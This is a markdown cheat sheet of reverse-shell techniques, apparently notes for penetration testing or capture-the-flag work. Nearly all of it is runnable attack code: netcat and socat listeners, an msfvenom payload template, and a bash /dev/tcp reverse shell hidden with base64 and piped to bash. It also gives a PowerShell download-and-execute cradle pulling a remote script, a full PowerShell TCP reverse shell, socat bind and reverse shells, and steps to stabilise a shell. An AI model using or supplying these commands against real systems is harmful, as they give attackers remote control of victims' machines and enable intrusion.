## Invoke listener for a reverse shell
```bash
# Netcat
rlwrap nc -nlvp 4444

# Socat
socat TCP-L:4444 -
```
## Generate shell using msfvenom
```bash
msfvenom -p PAYLOAD -f FORMAT -a ARCHITECTURE LHOST=127.0.0.1 LPORT=4444
```
## Base64 technique
```bash
# Encode shell using Base64
echo -n "/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1" | base64

# Execute shell
echo -n L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjEwLjEwLzkwMDEgMD4mMQ== | base64 -d | bash
```
## Upgrade / Stabilize Shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
export TERM=xterm
# then background shell by doing Ctrl + Z
stty raw -echo; fg
```
## Windows Reverse Shell
```cmd
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/revshell.ps1')
```
```powershell
$socket = new-object System.Net.Sockets.TcpClient("10.10.10.0",4444);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.StreamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
	$writer.Write("[spidersec]> ");
	$writer.Flush();
	$read = $null;
	while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null){}
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
	if(!$out.equals("exit")){
		$out = $out.split()
	        $res = [string](&$out[0] $out[1..$out.length]);
		if($res -ne $null){ $writer.WriteLine($res)}
	}
}While (!$out.equals("exit"))
$writer.close();$socket.close();
```
## Using socat
```bash
# Windows Reverse
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes

# Windows Bind (on target)
socat TCP-L:<PORT> EXEC:powershell.exe,pipes

# Linux Reverse
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

# Linux Bind (on target)
socat TCP-L:<PORT> EXEC:"bash -li"

# Connect to waiting socat bind listener
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
## Upgrade Normal Shell to Meterpreter (Metasploit)
[https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646](https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646)
## Resources
- [https://www.revshells.com/](https://www.revshells.com/)